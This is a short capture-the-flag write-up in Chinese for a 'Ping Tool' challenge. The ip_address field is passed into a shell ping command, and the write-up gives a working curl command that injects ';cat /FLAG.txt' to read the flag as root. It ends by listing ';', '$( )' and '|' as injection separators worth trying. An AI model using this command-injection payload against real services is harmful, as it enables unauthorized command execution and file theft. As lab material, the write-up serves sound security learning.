## 题解

### 入口与指纹

标题 `Ping Tool`，`POST /ping`，字段 `ip_address`，结果直接渲染在页面里。

### 关键观察

输入被拼进 shell：`ping ... <ip_address>`。`;` 没有过滤，命令输出整段回显。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -X POST --data-urlencode 'ip_address=127.0.0.1;cat /FLAG.txt' "http://$T/ping" \
| grep -o 'flag{[^}]*}'
```

执行身份是 root（`;id` 可确认）。`ls /` 显示 flag 就在根目录的 `FLAG.txt`（不是 `/flag.txt`）。

### flag 位置

容器根目录 `/FLAG.txt`。

## 复盘

- `;`、`$( )`、`|` 三个都试一遍，成本极低。
- flag 位置先从 `ls /` 确认，别默认 `/flag.txt`。
